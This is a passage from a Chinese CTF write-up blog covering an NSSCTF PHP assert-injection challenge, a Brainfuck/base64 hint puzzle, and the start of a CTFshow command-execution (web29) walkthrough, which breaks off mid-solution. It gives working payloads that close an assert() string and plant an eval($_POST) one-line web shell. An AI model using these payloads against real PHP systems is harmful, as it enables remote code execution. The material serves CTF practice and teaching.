<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!此路不通！！&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这里不是说了吗！！！必须是 732339662 (招新群群号！)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;啊？这是什么新型比较？&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;是不是题错了啊&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两种思路，分别讲述一下</p>
<p>首先都是先传入数字732339662，过第一个if，然后assert函数，内部为真继续，为假结束</p>
<p>逻辑或||的运算规则是一个为真即为真，后续不再计算，一个为假再计算右边的表达式，但是由于存在die函数，如果前面整体为真即可过，如果为假，后续进入die函数直接结束了。</p>
<p>因此我们可以的办法就是令整体为真，此时如果传入的Nss不是字符串，则is_numeric为假=0，此时左边整体为真。</p>
<p>此时PHP的版本是7.2.34，猜测是这个原因，所以常规的%0a%00绕过均失效，最终可用的来源于,</p>
<p><a href="https://www.bilibili.com/read/cv20228698/">记周赛遇到的一个is_numeric问题 - 哔哩哔哩 (bilibili.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?nss=732339662,1</span><br></pre></td></tr></table></figure>
<p>这是一种解法，还有一种思路值得参考，通过闭合绕过，因为存在die函数会直接结束进程，所以将其闭合即可，并且后面的直接注释掉即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?nss=732339662a;)//</span><br></pre></td></tr></table></figure>
<h3 id="真的是文件上传吗？">真的是文件上传吗？</h3>
<p>先来看一下按照本题预期（应该</p>
<p>最开始页面上是这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;-------.&gt;-.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;++.&lt;++++++++.&gt;---------.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++++.+.+++++.&gt;.&lt;&lt;&lt;-.&lt;&lt;&lt;------.&gt;&gt;&gt;++++++++.&gt;&gt;-----.&gt;++.&lt;----.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;++++++++.--------.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++.++++++.-----------.++++++.&lt;&lt;&lt;&lt;+....&lt;.&gt;&gt;&gt;------.&gt;&gt;+++++++.----------.&lt;&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;+++.----------.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;++.&lt;+++++.+++..&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;----.-------.&gt;-.&lt;.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++++.+.+++++.&gt;--.&lt;&lt;&lt;&lt;&lt;+.</span><br></pre></td></tr></table></figure>
<p>brainfuck解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You want a hint?</span><br><span class="line">Give me a flag!!!!</span><br><span class="line">And you will hava hint!</span><br></pre></td></tr></table></figure>
<p>然后get传入一个flag参数，即将迎来极其无语的一点，嵌套了n层的base，如果这是misc，我无话可说，但是这个是web，只能说一个6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5Zac5qyi5oiRV0TnmoRiYXNl5ZCXCj0obCNhLVpeRFBCT3I7dURlczYuRzxaRUEzW1x1KUYpIzVnLFhRSFZFLiZybTdWIjg8ME8tRzRGP2BCQjVxWUpcMWhLWzcvMXQ/bEBuJnNgLnNhKkY4NTFGVTtGclFdN1JDLUFDMXA0PjFlVHFrQDhKUlNFYz4+bjVVbktLNTxWK2wsckFwcDNfaiRPPUFnUEQ0XSxyQ0FwQGQpPGJZWmE2OjxfMTgxODRKNCo9dDsvcFY+OS40ODs4NSdlbmZCTiRObzU7UWJFNUAtV2gzYjszJUYmdVs4NVl0Y3I2Nm91RzVASFdmLT06KDg+QS4+TTRFIiM+MTQ7NXEzXmtuUDc5O2ohNTpwRGU3NipHVC44VlpnNVljPkM8Xjl0TzE0OzVkLldSNCksQ0VJMj1AdGMhNSNgZSktPUt0UTNJRyRmPF1FXTgxNDIyUTRZJ2hiPlVXby8uIW9LSDVYQExxPz9lKGkwLyQ3IjVWa19aM2I8SjQ0KGc2Y0BUY1RBO2BbXWU1J0xAJTMtbydeL29QJywuISUoaDVDLVVaNXVNLGEsQFlSSDxDOXRfOFBoKlxBb3FUXTc2T2QlRC1vXDM0JVc9XDBOKTFdLjU9a048YChKIzRaNWYwMkQ/akIsQmQ6LTU6JWdLM14+QjY0WzFZVTppME5TLjhPI20xaFQ8U0IuLEgtRClQVT08Xy1bTzVUcjozNCllTF01PUpeakUkZUBzNVRzbzkuOEYvcy47MyRrLm9CO0ExNDs4OjUlUVRhMC4wLyQuVEJEOzFJNE4lQDc7ZVo1Qz9UYDVCXj09Nm9KXmA8QFY5PDc5Kko/NjZuY0Q1JzgvYUYnVUNSRiY1dDJEJ2g4OjU/cDlMNSQxbG5AVlRkWS45QiJpNVg/XStAOEpYUC9qTkdyNUB1Vzk0YGtqRjVzWzRsM1xGX2A0RCVmIjUkTFE0NXNuXk0vb3Q7Y0UoK00jMTQqQTU0KDtIL0dyQlJwPEM6MjM0PidvZDVCJ2VGNzlhRz0tdTs6WDRFIiw2QXBaNCkuNjE5UjxAZ09DNTxyK28vUyYwRixCQCFGNFoiSHQ1VTk2RDY+XiImQkw/Kjc8YWV1YDVVUzcrLjo0YEI5NSU2cS45Ql8qM15jIzRCTCNsWSxYYmNgNjZvdUU1QEkpbDUkJzRDLD4yP002Nm9aITgxSF0wNCktRHI3OTtqITUiSypRNzY8U1FBcFowWjNFOilDRC5tYzQ5TzllW0A2XCRbLENFSTJEQ2UxYjU8MHVEMG1QVHMzXyE0Ni45QU4kN3FIQzc0JyxgNzxfPzdyNUEiNF81WEBMYTUjWDBaM15jSjREQ1NJNTFJM2BCNCheMGE1Wmg+OTtgUy9TNVg4WF8yY0YzNzNcIkdcPUU/MEQxM3RXUzV1TSxzNzowc2c8LFl0dThQYUlzQktdcCgvbm9FQzxhbkknNCVWLlJBcGRtNCw7RSVePGAoSis1XCJPXS9TJFBgPlZvXGc0RDhJazVDSThpM1xpRjE6aWZvKTxAXy11MUk0TjE/Ujc/UURHYVZaLjdjajEzWz9rMDQpSFpGNVtkZjJFJF09RjVAJS9LNUNIVS41Qz9aYy5WKUZmNVhJUFA1JVFBcTkvQXRGNlNWU0E4cCMySUA2bE1WNzlzcFc1QG1WaTNGP1BcQDY2LEZAVWBQYS5uV1RjNSc4UydGJ0M3UzNdOjpuLjxtakg1P3A8MjQpLmkrLjhPN3QuISYhNzUnVDFJNXVmWCsvak5fbzVVbktTNGBqcHQ0KEwnJDNdOWxLRENbbms1WCROLjJDcj5jL28rYFtFKCsyTjFJNUFNNCg7X25HckJSczxEdW10ND4oQHRBbyheNDc2PjNgPEdQQlI0RSJPTkFwbEArLjUscDI8QFVtVTUkTHA0L1MvQzM+Vjk4WC05dFsmN3FiZToxZlExYTppVUQuPEBfJykzXj4hLC46NGBCMiojLEEuOjY6MjNiOj9VRDBCNT8sVyZoPEUkXExVNUAlUG01Q0ciZzVcalNINXNKJ3A4MT9XLzUkOWBoNUM/YVw1IksrIjc2RVlTP0AiN3EzY1MxXkQuWltbNm9JLCtANlwnREJNVlRKPF8saDo1J15DOTppbkU6M14tW241QSE7bDVYbSY8NCcsYDc+VksmZDxJQF5pNSdTQWg1I2ozazFoVDxTRENdJEs2ImFNTzVzbT5FQG1YS0Y7YElabDUnTEAlNCkmMVA3N0NGJy1yT0BwMTNtL1AzXGlLcjFnWEt1PEUhKnA0PihiRUIuUGhpNzY9Rj88YW5JRjQlV2ErQXBkbGgsO0U1SDtgWzxJNFlKKnMvUyRcWyxDM1IxNVYiLWszXyooRDRbMVpBOmo2Miw8QF85MTFoSzZXP1I3RV1EKT5JPS43W1pjNVwhO1w1VnVlJjVVOUpeRSRbO0k1WEpAQS44RXJPNzdVWnVEYTZMNjgxSF1ANSVJbzQ5L0F0QjxAXyc9OHAjMklAN2kxJDNeUXNyPF08ZlYzRj9vKzxAZmUoLjdtVEwubk1yVDUnODJfRidVQ1UzXUxBTy45QU4mNT9xbyY0WiJjWEBWVDN1LXJOUUs1J1xHYT8/QG5nL2pPO1U1QHVXOTRdP04lN1hIZ2A3UStRcjREJWxBNVgkTWI0WV4jSC9wQ1NnRSgrOz8xSU9lYTQpLzshR3FzOnA8QzoyNThQYFc5NUFqXmQ3UCZJMjxHYiRAM2I7NiRCLUFzJS41LHAyPEBVbVU1JExwJDBOMjdwPlY5OFgtPUwrNTNfISJgMWZRLyY+Vjk+NC46NigxM187JVEuNlVwXjk1JTZxLjhPLyIzXmNEV0JMSC9gQGsoZXFFJFxMWTVASSY9LW4tV1E1XSdoNzRFIjUjODFbWHA1VHFkLjc5O2ohNSM+Nls3Nk4+QkA2bFA7M18hLjM8XjopMjlPO0Y1QDZcJSlCT2soXzYkUDImNTwwdWQtPVNmUTNcRmM3LjVyazc3cXM+ZzQrL2g8MC8kNEIuIW84XTVYP10zNSNqPFwxaFQ8UC42J1hANVhBWEg0KGc4azdRK1VEREJpSVg1J0xeRDJjRWRTPkIhbW4uISUoajVYOSgiNXQ+P2g3OCVQUzxFISpaOFBfSCJBbmllazc2PkVDPGApN3Q0JVhRaDBOKTFdLDtFRys8YChKJzRZSipiMUkzbEgsQyFIcjREOElrM15kXiszXGlCXzpqJCYqPEBfOTIzYjpmYC45QTJzREdPSlcuN2NjXDVAJDxSQkxqajQ1WXRVITY3IjYyNSdeJGY1VHFoLzU/VjwsRGE+W1o4MUhdQDUkOWFVOS9BdEY2VEouSTc2NVFfQDZaQVQ1Qz9bVDVBYTF1NTxXZEA8QFRZKUBWU2RnLm5NclU1JzhTLDppXDBGM106MicuNXM3WzU/cDwyNCcqcSJAVmVxWS5UQj1pNSdVZyM/P0BuZy9qPS9TNVVuSHM0YGo0bDxAJ0BUN1ErLldEQldhQzVYZTN1NChfUGo3Nk9wRS5ybldnMUk1ODc0KDtfbkYnTlc9PEM5WXM0XSxySDVBam1dOTRobTw8YW5ANjQ+J1FEQXBkbGk1VHRBOjxfbFYmNTxyKy4vUy9DMz5WOThYLTl0WyY1VUBcITFpaz9FPlYnYm0uOUJNKTQ9akJILjo0YFIyKiMsQS42aDhuNVRxaDBCTTJZZ0BrKHFjRENcXl01QElLOTV0Mz4yNV0nX0Y8QVI/ITgxW1hwNVY2NVQ1Qz9kRTxeOitCNzYzTVE/P2UsOzNjVDBgPF08b2k5ZDtfdUYnMTFcQk1WVy48XyxHJzUnXkMpOmlmcWczXTo+OTVBIV06NVVJZHE0JyxtNjxfPzgvLiEmcEA4UFVSSTV1VEJsMU8pPCE1VWZNZDRdNVc0NChnNmNAU3BUMzthRmk8NVg4W0UyY1g/OTpmcHBZLXJPPyExM20vKzV0Pj9nRigmQXU8Qzl0SThQZ145QXBlL1U3Nj0rKUQtb1xENCVYUXBBcGRsWCw6UUpWPGApN3A0WjVldTJEP3QwLEItayc1OiVeWTNfMy5FM2AlUE86ajYyLDxBUk4+MWhLNlc/UjdFXjk0aENNLjhPODY1W3VpWj9TRjAtNUInYj9FJGQxYTVUcyNlNUNHIlU8XWpdITY2cEFxODFIX0o1JVFCXDVCcUghPGRAXDc4MUdvZEA3O2VaNzlOWVE1Ql49PTZvSj9yPEBUWSlCS29SLC45S0FtNSc4Uyw6aW48RkYmNjBsLXJOJnU1P3FvJjQnKm48MWhmPyouISVtbDUnTGEiPz9ScWcvajtbNTxdRGciNF0+XTU3WEhncDNcRl9eREJXPTA1J0w9OkFwbXUxL3BDU2I8RSFGMjFGLG1dNXNKVWdHcmU8PzxDOjsmODFJbmdBbmtVWDc5YUorPGFuSSczW0BYOEFwZGxYLjhhX048QFVtWDVcPG9BME1zTkA+QUBJaDRZb0JHN3FiZToxaWNrcj5WOW5vLjo2KDE1VVM5NS45ZUhOMiojLEEuN1tTazVUcyQ8QkwjbFxAayhxY0UkXExPNUBJR081dDM+Mjc8RGpDNj1pYlA4MVFjMTY+XEEoNUJwSVg1Iz42cjc2PjQsQDZsUFw1VTpAbjxeOXQ5OU87RjVDZlhoS0JLJm4yLjlKdTg1PFc3UzBtUXRcOmZMT2kuNXMmITdxcz5nNCsvZUk8Xz84LS42aC0iNiJfS1o1dWZXXy44TkgtLjYnWEA1J1VkQTQoXjBiQFNwSyY7YUUtLTVYOFgnMmNPOTc+QiFuWj1FQGJyMTNtL0w1dD4/aD5DKDNDPEM5dF84UGdeOUJMUUp1NzY8bkc8YW5JMDQlWFFoME4pMW4sO0VJZTxAZmFaNVw8TVMwTidgST5WXU4iNSQ7X0w1VTk2JzNcaUYxOmlmbyo8QF8tdTFJNE4xLjlBKi05NSVPTC43Y2NgM0Y9Z1M1dHRXWjVZdFR1RSRkMWM1QCUvSzVDRyJVNUFGTFFEYT5bWjgxSF1INSVJbkk3OTxlPzZTVyJUODFBW1FANylZWDVZYjZPNUFqYjU0QUtaTjxAVFkpQktvUiwuOUtBbTUnOFBWLT04QV8zXUxGcC5XJUJzNT9xbyY0WXAyLkBWUzpXLjZnXXM1J1NBYDVDInRNL2o9L1M1QSI0VzRgajRsNXNbNG1AU3AkOi05ImgmNVhlNDAuV0pyRy9vK2BbPER0RDYxSTViazQoOzh1RicqPzs8Qzo7JDQ9amNdQW8oYVo3OWFKKkQuYlBMNEUiLDZCLUFzNzU7Uk9LPGAqJ1I1JExzIi9TLVZRPkFARD4tPUwiRzFGLGprMWlrP0VCTD9aOy44TnIhNVVTOTUuOUEwOjIqIyxBLjdbU2s1VHMkPEQwZk1GQGsocWE8QF8nQjVAJXU8NXQ1MDk1XSdfSjVzSidwODFBN141VjY1VTVDLFw+NSJLKlE4MT9XQz9AIjRLM2NUMGI1QG1gLDZvSSwrPEBCUC1CTGMpYTxfLERyNTxXN1MwbVA2RjNeLVk9LjV0JUk3cUZlSzQnKyRsPGAyaDMuIW82JjUnU0FoNSNqM2sxaGZsW0RDZSskNiJhT000KFUqYUBUY1lhO2FFLS41J0xAJTJEQVZnPkIhblo9RUBicDEzbS9MNVY2RE03OCQhcTxITU9tND4vIWBCS11vbTc2PWdiRC1dc100JVdfKTJDTWo5LDpRbCM8YCk3ZzRaNjJCME4nYEwsQyFGLzU6JV5ZM18zLkU2P3Q7KzppQlpVLjhOaS4xaEs2Vz9SL11LRiQ8ZkwuN1tmVjVYSU09NVcoOE41WXRUdTREL0pUNVhKQEE1VHFqOjc8RGpINXNLMTY3cU9rODUlSi86OmkvVTA2U1ZTMTgxSSwjQDcpWVg3OU5ZUTVBIjIpNm9KP3I8QEJSZzc5KkFNLjlLQW01JzhWKjppbjxGNzhJMzQuNXM3WjdxSEVyNFoiZj4xaGY/Ki1yTlFLNSdVZyM/P0BuVy9qTl9vNUB1VFA1J15LXDVzZDpdM1xGPEQtOSM0UTVDK1lIMkRKTW8vcENTZ0UoK00kNVRzSzo1c0pbMkdxczpwPEM5dEg1J15GWDVzZDRhN1AmN048R1BCVjQlV0BeQi1BcyUuNSsmOTxAZ09GNTxyK18vUyYuKT5BUkxvLT1LMl43cWJlOjFpY2tyOmlUY2c8X3VkTzVVUzcrNVUucS0yKiNBSy43W2hyM15ja1lEMEI1QkBrKE0+NiRRZ0o1QCYldDQpJDBPNzxEYVI2Nm9RMTgxUWMxNVRxZG83OSpXOzVwb3RgNzY+NCtCTEZMRTNfIS4zNUBtVzk5TztGNUNmWGVFQFNwKkY8XyxoOTU8MHVUMG1QSnVCTGMvc0RDXD1DN3FzPlY0JypuPT5VV0toLjV0QDY1WEApQTUjWDBaMU8pRGFEQ10kSzU8VV9KNCheMGJAbVhObTtgSVpzNVg4VUEyREpcZz5CIW1zRCdncmExM20vTDVyQ01HPkMmWWE8RSEqbzhvbUtpQkwiMHAvbm1eXjxgKTd0NCVWcTkwTT0qKCw7RTVIPGAoSjY1JExORjBOKUEmLEJSLis1VTEjKjNeZFwuNj90NDM6aiQmKjxfdXQ4MkQ3UiI/Ujc/UURHT0pYLjdbaSE1PFYmNzV0dFdaNVtkZjFFJGQxYzVAJS9LNVRxaC81P2g+UERhN2BNN3FPaSY1JUluSTc5PGU/NlNXIlQ4cCMySUA3KVlYNzlOWVE1QG1WbTRBS1dQQDZIOEhCS29XTC45S0FoNSc4Vio6aW48SDNdOjVNLjxtakM1P3A8MjUkMW9UQFZBLlUuNmdgVTUnVHQ5Pz9Abmcvak5fbzxgaCVvNGBqNGw3WEhqRjdRKy5XO2BJWlQ1WGUzdTVzbl5eMC5VPHFFKCtEMTFJIzVLNXNKaiwxaDFHWzxFIUY0ND4nb19BbmthKzVUc2lARC1nWGQ0PidKYDBOMjdOLjhQNDc8YCE0PDUkTHJWL1MtVlE+Vjk4WC06JnFrN3FiZUoxaWNrckYnPEhUPD9rTCE1VVNaRy42VXMzNVl1L20uOE8uczVYSStrRDBJWy41WDhzUzY2b1EqNUAldTw1dDUwKjVcalw1NjZvOFgxNDNlRjVWNjVVNUMtVVk1cHAraTc2M09zQDZsTGozY1MxXkQubWM5M0JxNFhDZlc4OEJMYyRCPF8saEk1PFc3Uy1uLXVvM18hNEUuNXNqYDVYbSY8NFlwQ2o8Xz86XTxJQG5SN1VJSFc1I1gnaTFoZmxbRENdJEs2ImFPTTQoOW1dN1ErSW07YElUPjVYOFslMkRKXGg+QiFxPy1yTz8hMTNtL0w1dD4/aDc4JCFxPEZmPCw4UGFJc0JNYDgrNzY9Z2JELV1zXTQlWDBGME4pMV0sO0VHKzxgKTdfNFo2MkI0KS1UbyxCLWsnLTl1RHQzXyooRDRbMWJnPF8/WFo8X3VkczFoQjBWP1I3RklER09KVzxgKTdjNVt1aVlCLzs1OTVYOEllNEQtaiU1VHMkMC44RXI+NT9WPCxEYTgsZTE0PGtHNSVKLzo5L0F0Rj0maVs3NzY1MDVANmxNVjAuVSdiNUBtVm00QUtRcDxAZmUrQktvV0w1ViNXVzUnOFQsRidDQERCSzlAQS41czdbNVhtJUg0WiJjWEBWVGRZLjVzYjE1J1VnI0A4SlhQL2pOYFU1QHVXOTRdPl01NChMJD4zXEY/KDREJWw5NUMrWUg1c25eTS9vdDtjRSgrJlsxNDxNMzQpLzshR3JCUnI8Qzo7PDQ+J29fQktlKC83OWFSbTxHYi0xND4nUURBcGxAKy42MTQxPEBnT0I1PHIrby9TJFJtLEJAIUY0RSlUWzdxYmUpNj90N1lCTD9cbDxfdWROM187RmMuOWVITjIqI0o9LjlCdC01VHJSOkRCVz1DQGsoTT42JFFnSDVASSlsNXQzPjI1XSdfRjY2b1ExODFRYzEyQ0w0LDVCcElXNXBvdSE3Nj40LEA2bFMhNVR0LmtELlpdaTlPOWVbQ2ZYaGksQV4+IjYkUUMhNTwwdUQwbVBCLjNJNGRpLjVzST03cUZlVzQnLGA3PlVXS2guIW84XTc2M09nNSNYMFoxTylEYURCVmgtNF0/SyM0KEwkXzVaaD8mO2BJVD41WDhSRzJjTzk3PkIhcUREJ2lQOjEzbS9MNXQ+RTQvcFRnNDxBUmlPOFBgNWZCTFFKdS9ub0VDRC1vXE40PicsdDJEQUUjNTxXJXA8QGZhWjVcPE1TL1MkUl0sQmQ6LTVVMStxM2IydEs0WzFUNTppZm8oPF91dDgxaEIwVjVWPWNHREdhVlouN2NqMTNeYyM5NVcoNWg1WXRXWjY2cEFsNF0sKj01Q0hnYzU/aD5QRGE3YEM4MUhdQDUkMjwuNUJvUEA9JmlbNzRdNkUiQDZINVI3OU5ZUTVCXklBNTxXW2I8QFRZKUJLb0k6Lm5XVF01JzhTJ0ZYOFh0M106Om4uOUFfWzU/cDwyNEZKX0lAVlM6Vy42Z15FNSdUdDlAOEpbRi9qPTIzNVVuSTM0YGpwdDJDXkBuM14tam5DMWdoIzVYSmRhNXNuXl4vb3Q7Y0QrNk5VMUk1QU01c0pkX0YmWyc3PEM5a1Y0PWplYDVBal5kN1AmN1U1QC1XcDQ+J3FiQXBsQCsuOFAxUjxAZmFSNVw8bkUvUyRSbEJMUTAvPEFSYEg3cWJlSjY/dDdZMC5VcnE8QF8nKTQ9akJILjllSzMuTnJNKDxfLUZENVRyNkxEMElbL0BrKGVvNiRRQyo1VHNpVjV0NTAqNVxqXDU0RSFxRjgxQTdeNSQ5YGk1QyxcPjU6cEQ+N1VCZVBANmxNNTNjUzFeRC5tYzQ5TzllW0A2bjNGQk1WVEouN1p1YTUnOCw6MG1QNkYzXj9uKzxdRUtVODE/WWU0JyxXRTxfP1lHPElAXmk2Il9LWjUjWCdpL2o7Wy5EQ1tGcjVYQV8oNXNSLEJAbVhObTtgSVpsNSdMNycyREpcaC9vT3M6LXJPPnQxM20vKzVyQ0gnNzowcSw8RSEzTDhQYUlzQktdb203Nj5VLEREWGFaNCVYMEYwTikxXSw6UWwjPEBmX0w0WjVldTFJM2xILFZFOzs1VTErbTNfKihENFsxVm86aTBLIjxBUmk5MWhLNlcuOUE7Vi5OciM7LjhPODY1WElxVi46UVU9NVtkZjI0RC44QTVVQW9XNUNIVS41QUZNPURhNm9cODFIXGw1JDlhVTFncmRYPSZpWzc4cCMyUUA3aTEkMWhCZjo1QWpiNTNGP0gpPEBWOTosQV4+Ii44Ti9YNSc4VCxGJ0M3YDc4SS9xLjlBTic3cUZiXTUiNyMuMWhnaSstWjJGZjUnTGEiNXVmVUUvak5HcTxgaCg6NF0+XTU3WEhqVjNcRjxDQzFnais1WEpkYTRZZVdHL3BDU2dFKCtEMjVDK1xCNXQ+MG9HcXM6dS1waD9aND4nb19BbyhYaTc5YVtgPEdiJEA0XT45akFwW2ZXLDpSKSE8QGZhUzU8citfME11K24+Vjk7RzRZcDpyMUYjZUYxaWNrckJMP1xsPGBpSG4zXztGYzVVbkY0MioiZWUuOFc8RDVUclI6RDBCNT8sWGJjYDYkUWdDNUBJKWw2bz9IJDc8RGpDNj1pa0I4MVFjMTV0PFNCNVRyTDs1OnAvRDc2PFNSQDZsUFw1VTpAbjxeOitCOU87RjU8QEQuJCxBXj4iNiRQMiY1PFc3ZC09U2ZRM14tWT0uNXNqXzgxQTdRNCcsV0U8YDJoNy4hbmw7NiJfS1o1dWZXXzFPKURfRENbRnI1WEFYRDQoXjBiQG1YVFREQlZoQjVYSmFkMmNFZFM3NnQ5VEQnaVA6MTNrUXM1dD4/aC9wVkBqPEUhKm84UGdeOkZYOGJgL25vRUM8YW5JMDQlVnFBQXBkbEgsO0U1SDtgWk5qNVwiT10xSTNgTT5WS0F1NVUxK201VTk2JzRbMVZvOmokKVsuOE8vKjNiTC9vP1JbVG9ER09KWTxfNVY1NVt1aV41Vyg1aDU9Sl4oNjZwQWw1WEpAMTVDP08tNUFGTT1EYTZvUjgxSF1INSQyPC45L0F0RjZTVyJUOHAjMlFANylZWDc5TmJDNUFhMXE0QUtaTjxBI3EtQktvRWgubk4+ZDUnOFMnRidDN1MzXUxGcC5rcyVSNT9wPDI1IjclaUBWQS5VLiEmcCk1J1R0OT9SbWpAMWUoZSY1VW5IajRgajRsN1hIajdAVGQiXERDW3B1NVhlM3UuV0pOZDc2dDNIRStVVWQxSSMsNTQoO19uR3JmayM8Qzo7JDRdPlgpNUFqWUQ3UCY3UjxhbkknNCVXPWAwTikxTS44UDFRPGAhNDw1PHIuTC9TJi4pPlY5O0c0WW5UVzdxYmReMWljblg+VidlSjw/a0whNVVTWkcuOWVLMzIqIyxBLjhPLyIzYjpFNURDSm06NVg4WGI2Nm9RKjVAJXU8NUNHIlc1XSdoNzUlLi84ODFIXTA1dDxTQTVDLVVaNTpwO0w3VUJlUD9AIjdxM2NULmZELlpdbzNGP0sjQ2ZYamZCTGMnJjxfLEcnNSNgZG4wbVBKdTNeP24rPF1FS1U3cXM+ZzQnKzdcPGAyaDcuISZwQDYiX0taNSNYJ2kxTyk7b0RDW0ZyM0JnXDo0KFUqYUBtWEtGO2FGaTU1WDhbRTJjWD84PkIhaE0tck1qODEzbS8rNXQ+P2kuN1w7MzxFITNLOFBhSXRGWDFOYTc2PWdiPGFuSHA0JVc9ZEA2LlwyLDw4ZVA9QSg4KzRaNWV1MUkzYFAsQXBfJTU6JiIxM18zLkE0WzFWbzpocz51PEFSTj4xaEIwWjVVbktDREdhVlo8YCE0NzVYSXQ7NVZ1YkA1W2RmMUUkXExVNUAmJWQuOEQ/ZTVBRk09RGE2b1I4MUhdSDUlUUJcM14sckVFQUNOYDhwIzJRQDcpW3I1VTpAbjVAJVEkNEFLUXA8QFRZODVCcDc8Lm5NclU1PFc+I0YnQ0BFM11MPikuOUFOJjVYbSVINCcqbjxAVlRkWS48bj9yNVg4NFg/Um1qLy9qTjxTNVVuS0M0XT1tSzdYSGdwM1xGX15DMWdpcjUnTD0/Nj5LbWAvb3Q7VS1yT1NZOWQ7RHA1c0pqK0dxcWE1PEM6KDk0PidvX0Fua2ErN1AmN1I8YW5JJzRFIi8wMkNMN1AuOFA0NzxAaD8sNTxyLjwvUyYuKUYkKllXLT1LMl03cWJnYDNfcyRVQkw/Kjc8YGlIbTVVUzk1LjllSE41O1FNYS44VzxANVRyUjpEQlc9Q0BrKFYwNjZvUSo1QCYldDQpJFdNLXQtRmg2PWliUjgxSj1fNXQ8U0E1Qy1VWjUjPjY2NzY+NCxANmxQXDVVOkBwLjZmTSg5TzllXy5XU2clQkxjJEJEZz1OZzU8V15xMG1QSnUzXyE0RS41cyYhNVhtJis0JyxaODAvJDRALiEmXVU2Il9LRTUjWDBaLXQsTG41QSI0VzRgaT5GLjclNWwzRThbJA==</span><br></pre></td></tr></table></figure>
<p>最终得到的提示是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你所上传的即是命令</span><br></pre></td></tr></table></figure>
<p>看了一眼框架，python的flask，直接读环境</p>
<p><img src="https://s2.loli.net/2024/02/21/n2jT4w5N6gbPhtx.png" alt=""></p>
<p>乐（</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>NSSCTF Round</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-命令执行</title>
    <url>/2024/01/17/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1>CTFshow-命令执行</h1>
<h2 id="web29">web29</h2>
<h3 id="源码">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload">payload</h3>
<p>简单分析一下，可以看到，危险函数是eval，但是只进行了对flag的过滤，还是比较简单的</p>
<h4 id="方法一">方法一</h4>
<p>比较简单的一个，不考虑过滤，使用eval传一个一句话木马进去，蚁剑连接即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_POST[1]); </span><br></pre></td></tr></table></figure>
<h4 id="方法三">方法三</h4>
<p>*绕过flag，但是需要在源码中查找flag</p>
